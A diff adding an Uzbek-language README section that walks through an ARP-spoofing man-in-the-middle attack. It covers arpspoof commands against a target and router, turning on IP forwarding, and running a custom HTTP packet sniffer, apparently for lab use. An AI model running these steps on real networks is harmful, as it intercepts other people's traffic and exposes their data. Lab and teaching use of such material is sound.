@@ -60,4 +60,38 @@ Muallif loyiha noto‘g‘ri yoki noqonuniy maqsadlarda ishlatilishi uchun javob
 
 ---
 
+## Hujumni amalga oshirish
+Dastlab qiladigan ishimiz ARP-spoofing hujumini amalga oshirish bo'ldi.
+Buning uchun Kali Linux da or'natilgan **arpspoof** dasturidan foydalandim yoki o'zim yozib chiqqan https://github.com/UZinfosec404/ARP-spoofing
+dasturidan foydalanishingiz mumkin.
+1-qadam.Yangi terminalda quyidagi kod ni ishga tushurasiz.
+```
+arpspoof -i eth0 -t target_ip router_ip 
+```
+2-qadam.Bu kodni ham yangi terminalda ishga tushurasiz.
+```
+arpspoof -i eth0 -t router_ip target_ip
+```
+3-qadam.Agar hujum qilayotgan mashinada internet uzulib qolishi mumkin shuning uchun kelayotgan packetlarni yo'naltirish lozim
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+4-qadam. Sniffer_packet dasturini ishga tushurish.Ishga tushurish uchun root huquqi talab qilinadi.
+```
+python3 sniffer_packet2.py -h                                                                                                                                                                                                          
+usage: sniffer_packet2.py [-h] -t TARGET -i INTERFACE
+
+HTTP Packet Sniffer (faqat lab/test muhitida)
+
+options:
+  -h, --help            show this help message and exit
+  -t, --target TARGET   Target IP manzil (masalan: 192.168.1.10)
+  -i, --interface INTERFACE
+                        Tarmoq interfeysi (masalan: eth0, wlan0)
+```
+Biz quyidagicha argumentlarni dasturga kiritamiz:
+```
+python3 sniffer_packet2.py -t 10.236.108.83 -i wlan0
+```
+
 
